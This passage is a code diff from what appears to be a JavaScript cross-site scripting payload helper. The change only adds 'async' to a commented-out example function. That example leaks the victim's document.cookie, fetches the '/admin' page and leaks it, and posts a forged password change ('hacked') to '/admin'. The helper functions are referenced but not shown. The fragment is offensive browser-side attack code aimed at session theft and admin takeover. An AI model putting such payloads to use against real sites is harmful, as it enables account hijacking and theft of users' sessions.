@@ -53,7 +53,7 @@ function postPageFetch(url, data) {
 
 // Examples
 /*
-function run() {
+async function run() {
     leak(document.cookie);
     leak(await getPageFetch('/admin'));
     leak( await postPageFetch('/admin', '["password":"hacked"]'));
